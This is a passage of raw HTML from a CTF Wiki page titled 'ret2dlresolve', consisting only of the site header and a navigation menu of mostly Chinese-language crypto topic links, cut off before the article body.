<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CTF Wiki"><meta name=author content="CTF Wiki Team"><link href=https://ctf-wiki.org/en/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve/ rel=canonical><link rel=alternate href=/ hreflang=en><link rel=alternate href=/en/ hreflang=en><link rel="shortcut icon" href=../../../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.1.2, mkdocs-material-6.2.3+insiders-1.15.0"><title>ret2dlresolve - CTF Wiki</title><link rel=stylesheet href=../../../../../assets/stylesheets/main.361444fb.min.css><link rel=stylesheet href=../../../../../assets/stylesheets/palette.697e47cb.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font-family:"Noto Sans",;--md-code-font-family:"Source Code Pro",}</style><link rel=stylesheet href=https://ctf-wiki.org/static/css/extra.css></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#_1 class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=https://ctf-wiki.org/en/ title="CTF Wiki" class="md-header__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> CTF Wiki </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> ret2dlresolve </span> </div> </div> </div> <div class=md-header__options> <div class=md-select> <span class="md-header__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg> </span> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=/ class=md-select__link> zh - 汉语 </a> </li> <li class=md-select__item> <a href=/en/ class=md-select__link> en - English </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 00-3 3 3 3 0 003 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0018 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear data-md-component=search-reset tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/ctf-wiki/ctf-wiki/ title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../../../../../introduction/history/ class=md-tabs__link> Introduction </a> </li> <li class=md-tabs__item> <a href=../../../../../crypto/introduction/ class=md-tabs__link> Crypto </a> </li> <li class=md-tabs__item> <a href=../../../../../web/introduction/ class=md-tabs__link> Web </a> </li> <li class=md-tabs__item> <a href=../../../../../assembly/x86-x64/readme/ class=md-tabs__link> Assembly </a> </li> <li class=md-tabs__item> <a href=../../../../../executable/elf/structure/basic-info/ class=md-tabs__link> Executable </a> </li> <li class=md-tabs__item> <a href=../../../../../reverse/introduction/ class=md-tabs__link> Reverse </a> </li> <li class=md-tabs__item> <a href=../../../../readme/ class="md-tabs__link md-tabs__link--active"> Pwn </a> </li> <li class=md-tabs__item> <a href=../../../../../android/basic_develop/basic_develop/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../../../../ics/ctfs/ class=md-tabs__link> ICS </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=https://ctf-wiki.org/en/ title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> CTF Wiki </label> <div class=md-nav__source> <a href=https://github.com/ctf-wiki/ctf-wiki/ title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1 type=checkbox id=nav-1> <label class=md-nav__link for=nav-1> Start <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Start data-md-level=1> <label class=md-nav__title for=nav-1> <span class="md-nav__icon md-icon"></span> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../.. class=md-nav__link> CTF Wiki 简介 </a> </li> <li class=md-nav__item> <a href=../../../../../discussion/ class=md-nav__link> 讨论 </a> </li> <li class=md-nav__item> <a href=../../../../../contribute/basic/ class=md-nav__link> 贡献指南 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-2 type=checkbox id=nav-2> <label class=md-nav__link for=nav-2> Introduction <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Introduction data-md-level=1> <label class=md-nav__title for=nav-2> <span class="md-nav__icon md-icon"></span> Introduction </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../introduction/history/ class=md-nav__link> CTF 历史 </a> </li> <li class=md-nav__item> <a href=../../../../../introduction/mode/ class=md-nav__link> CTF 竞赛模式简介 </a> </li> <li class=md-nav__item> <a href=../../../../../introduction/content/ class=md-nav__link> CTF 竞赛内容 </a> </li> <li class=md-nav__item> <a href=../../../../../introduction/experience/ class=md-nav__link> 线下攻防经验小结 </a> </li> <li class=md-nav__item> <a href=../../../../../introduction/cgc/ class=md-nav__link> CGC 超级挑战赛 </a> </li> <li class=md-nav__item> <a href=../../../../../introduction/resources/ class=md-nav__link> 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> Crypto <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Crypto data-md-level=1> <label class=md-nav__title for=nav-3> <span class="md-nav__icon md-icon"></span> Crypto </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/introduction/ class=md-nav__link> 密码学简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-2 type=checkbox id=nav-3-2> <label class=md-nav__link for=nav-3-2> 基础数学知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础数学知识 data-md-level=2> <label class=md-nav__title for=nav-3-2> <span class="md-nav__icon md-icon"></span> 基础数学知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/basic/introduction/ class=md-nav__link> 基础数学知识 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-3 type=checkbox id=nav-3-3> <label class=md-nav__link for=nav-3-3> 古典密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=古典密码 data-md-level=2> <label class=md-nav__title for=nav-3-3> <span class="md-nav__icon md-icon"></span> 古典密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/classical/introduction/ class=md-nav__link> 古典密码简介 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/classical/monoalphabetic/ class=md-nav__link> 单表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/classical/polyalphabetic/ class=md-nav__link> 多表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/classical/others/ class=md-nav__link> 其它类型加密 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/classical/summary/ class=md-nav__link> 总结 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-4 type=checkbox id=nav-3-4> <label class=md-nav__link for=nav-3-4> 流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流密码 data-md-level=2> <label class=md-nav__title for=nav-3-4> <span class="md-nav__icon md-icon"></span> 流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/intro/ class=md-nav__link> 流密码 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-4-2 type=checkbox id=nav-3-4-2> <label class=md-nav__link for=nav-3-4-2> 伪随机数生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=伪随机数生成器 data-md-level=3> <label class=md-nav__title for=nav-3-4-2> <span class="md-nav__icon md-icon"></span> 伪随机数生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/prng/intro/ class=md-nav__link> 伪随机数生成器介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/prng/csprng/ class=md-nav__link> 密码安全伪随机数生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/prng/problem/ class=md-nav__link> 题目 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/special/rc4/ class=md-nav__link> RC4 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-4-3 type=checkbox id=nav-3-4-3> <label class=md-nav__link for=nav-3-4-3> 线性同余生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=线性同余生成器 data-md-level=3> <label class=md-nav__title for=nav-3-4-3> <span class="md-nav__icon md-icon"></span> 线性同余生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/lcg/intro/ class=md-nav__link> 线性同余生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/lcg/challenge/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-4-4 type=checkbox id=nav-3-4-4> <label class=md-nav__link for=nav-3-4-4> 反馈移位寄存器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反馈移位寄存器 data-md-level=3> <label class=md-nav__title for=nav-3-4-4> <span class="md-nav__icon md-icon"></span> 反馈移位寄存器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/fsr/intro/ class=md-nav__link> 反馈移位寄存器 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/fsr/lfsr/ class=md-nav__link> 线性反馈移位寄存器 - LFSR </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/streamcipher/fsr/nfsr/ class=md-nav__link> 非线性反馈移位寄存器 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5 type=checkbox id=nav-3-5> <label class=md-nav__link for=nav-3-5> 块加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=块加密 data-md-level=2> <label class=md-nav__title for=nav-3-5> <span class="md-nav__icon md-icon"></span> 块加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/introduction/ class=md-nav__link> 块加密 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5-2 type=checkbox id=nav-3-5-2> <label class=md-nav__link for=nav-3-5-2> ARX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ARX data-md-level=3> <label class=md-nav__title for=nav-3-5-2> <span class="md-nav__icon md-icon"></span> ARX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/arx-operations/ class=md-nav__link> ARX: Add-Rotate-Xor </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5-3 type=checkbox id=nav-3-5-3> <label class=md-nav__link for=nav-3-5-3> DES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DES data-md-level=3> <label class=md-nav__title for=nav-3-5-3> <span class="md-nav__icon md-icon"></span> DES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/des/ class=md-nav__link> DES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5-4 type=checkbox id=nav-3-5-4> <label class=md-nav__link for=nav-3-5-4> IDEA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=IDEA data-md-level=3> <label class=md-nav__title for=nav-3-5-4> <span class="md-nav__icon md-icon"></span> IDEA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/idea/ class=md-nav__link> IDEA </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5-5 type=checkbox id=nav-3-5-5> <label class=md-nav__link for=nav-3-5-5> AES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=AES data-md-level=3> <label class=md-nav__title for=nav-3-5-5> <span class="md-nav__icon md-icon"></span> AES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/aes/ class=md-nav__link> AES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5-6 type=checkbox id=nav-3-5-6> <label class=md-nav__link for=nav-3-5-6> Simon and Speck <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Simon and Speck" data-md-level=3> <label class=md-nav__title for=nav-3-5-6> <span class="md-nav__icon md-icon"></span> Simon and Speck </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/simon-speck/ class=md-nav__link> Simon and Speck Block Ciphers </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5-7 type=checkbox id=nav-3-5-7> <label class=md-nav__link for=nav-3-5-7> 分组模式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=分组模式 data-md-level=3> <label class=md-nav__title for=nav-3-5-7> <span class="md-nav__icon md-icon"></span> 分组模式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/introduction/ class=md-nav__link> 分组模式 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/padding/ class=md-nav__link> 填充方式 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/ecb/ class=md-nav__link> ECB </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/cbc/ class=md-nav__link> CBC </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/pcbc/ class=md-nav__link> Pcbc </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/cfb/ class=md-nav__link> CFB </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/ofb/ class=md-nav__link> OFB </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/ctr/ class=md-nav__link> CTR </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/blockcipher/mode/padding-oracle-attack/ class=md-nav__link> Padding Oracle Attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6 type=checkbox id=nav-3-6> <label class=md-nav__link for=nav-3-6> 非对称加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=非对称加密 data-md-level=2> <label class=md-nav__title for=nav-3-6> <span class="md-nav__icon md-icon"></span> 非对称加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/introduction/ class=md-nav__link> 介绍 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6-2 type=checkbox id=nav-3-6-2> <label class=md-nav__link for=nav-3-6-2> RSA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=RSA data-md-level=3> <label class=md-nav__title for=nav-3-6-2> <span class="md-nav__icon md-icon"></span> RSA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_theory/ class=md-nav__link> RSA 介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_module_attack/ class=md-nav__link> 模数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_e_attack/ class=md-nav__link> 公钥指数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_d_attack/ class=md-nav__link> 私钥 d 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/ class=md-nav__link> Coppersmith 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/ class=md-nav__link> RSA 选择明密文攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_side_channel/ class=md-nav__link> RSA 侧信道攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/ class=md-nav__link> Bleichenbacher's attack </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/rsa/rsa_complex/ class=md-nav__link> RSA 复杂题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6-3 type=checkbox id=nav-3-6-3> <label class=md-nav__link for=nav-3-6-3> 背包加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=背包加密 data-md-level=3> <label class=md-nav__title for=nav-3-6-3> <span class="md-nav__icon md-icon"></span> 背包加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/knapsack/knapsack/ class=md-nav__link> 背包加密 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6-4 type=checkbox id=nav-3-6-4> <label class=md-nav__link for=nav-3-6-4> 离散对数相关 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=离散对数相关 data-md-level=3> <label class=md-nav__title for=nav-3-6-4> <span class="md-nav__icon md-icon"></span> 离散对数相关 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/discrete-log/discrete-log/ class=md-nav__link> 离散对数 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/discrete-log/elgamal/ class=md-nav__link> ElGamal </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/discrete-log/ecc/ class=md-nav__link> ECC </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6-5 type=checkbox id=nav-3-6-5> <label class=md-nav__link for=nav-3-6-5> 格密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格密码 data-md-level=3> <label class=md-nav__title for=nav-3-6-5> <span class="md-nav__icon md-icon"></span> 格密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/lattice/overview/ class=md-nav__link> 格概述 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/lattice/introduction/ class=md-nav__link> 基本介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/lattice/lattice-reduction/ class=md-nav__link> 格基规约算法 </a> </li> <li class=md-nav__item> <a href=../../../../../crypto/asymmetric/lattice/cvp/ class=md-nav__link> CVP </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7 type=checkbox id=nav-3-7> <label class=md-nav__link for=nav-3-7> 哈希函数 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=哈希函数 data-md-level=2> <label class=md-nav__title for=nav-3-7> <span class="md-nav__icon md-icon"></span> 哈希函数 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/hash/introduction/ class=md-nav__link> 哈希函数 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-2 type=checkbox id=nav-3-7-2> <label class=md-nav__link for=nav-3-7-2> MD5 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MD5 data-md-level=3> <label class=md-nav__title for=nav-3-7-2> <span class="md-nav__icon md-icon"></span> MD5 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/hash/md5/ class=md-nav__link> MD5 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-3 type=checkbox id=nav-3-7-3> <label class=md-nav__link for=nav-3-7-3> SHA1 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SHA1 data-md-level=3> <label class=md-nav__title for=nav-3-7-3> <span class="md-nav__icon md-icon"></span> SHA1 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/hash/sha1/ class=md-nav__link> SHA1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-4 type=checkbox id=nav-3-7-4> <label class=md-nav__link for=nav-3-7-4> FNV <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=FNV data-md-level=3> <label class=md-nav__title for=nav-3-7-4> <span class="md-nav__icon md-icon"></span> FNV </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/hash/fnv/ class=md-nav__link> Fowler–Noll–Vo hash function </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-5 type=checkbox id=nav-3-7-5> <label class=md-nav__link for=nav-3-7-5> Hash Attack <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hash Attack" data-md-level=3> <label class=md-nav__title for=nav-3-7-5> <span class="md-nav__icon md-icon"></span> Hash Attack </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a 